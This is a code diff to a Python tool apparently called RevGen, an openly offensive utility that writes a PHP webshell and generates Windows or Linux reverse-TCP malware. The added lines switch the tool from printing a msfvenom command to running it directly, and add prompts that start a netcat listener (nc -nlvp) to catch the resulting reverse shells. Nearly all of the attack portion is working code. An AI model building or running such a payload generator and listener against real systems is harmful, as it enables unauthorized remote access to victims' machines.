@@ -1,6 +1,11 @@
 #!/usr/bin/env python3
+import os
+import subprocess
+
 
 def main():
+    os.system('clear')
+    
     # ASCII Art Placeholder
     print("""
 
@@ -57,6 +62,13 @@ fclose($sock);
         file.write(php_shell)
     print("PHP webshell created as shelly.php")
 
+    # Ask user if they want to start a webshell listener
+    start_listener = input("Do you want to start a webshell listener (y/n)? ").lower()
+    if start_listener == 'y':
+        os.system(f"nc -nlvp {lport}")
+    else:
+        print("Thanks for using RevGen!")
+
 def create_malware(lhost, lport):
     print("1. Windows\n2. Linux")
     os_choice = input("Choose the target OS (1 or 2): ")
@@ -83,9 +95,29 @@ def create_malware(lhost, lport):
     file_type = "exe" if payload_os == "windows" else "elf"
     file_name = "payload.exe" if payload_os == "windows" else "payload.elf"
 
-    msfvenom_command = f"msfvenom -p {payload_os}/{payload_type}_reverse_tcp LHOST={lhost} LPORT={lport} -f {file_type} -o {file_name}"
-    print("Run the following msfvenom command to generate your payload:")
-    print(msfvenom_command)
+    msfvenom_command = [
+        "msfvenom",
+        "-p", f"{payload_os}/{payload_type}_reverse_tcp",
+        "LHOST=" + lhost, 
+        "LPORT=" + lport,
+        "-f", file_type,
+        "-o", file_name
+    ]
+    print(f"...Generating malware using {' '.join(msfvenom_command)}")
+
+    try:
+        subprocess.run(msfvenom_command, check=True)
+        print(f"Malware generated and saved as {file_name}")
+    except subprocess.CalledProcessError as e:
+        print("An error occurred while generating malware.")
+        return
+
+    # Ask user if they want to start a listener
+    start_listener = input("Do you want to start a listener (y/n)? ").lower()
+    if start_listener == 'y':
+        os.system(f"nc -nlvp {lport}")
+    else:
+        print("Thanks for using RevGen!")
 
 if __name__ == "__main__":
     main()
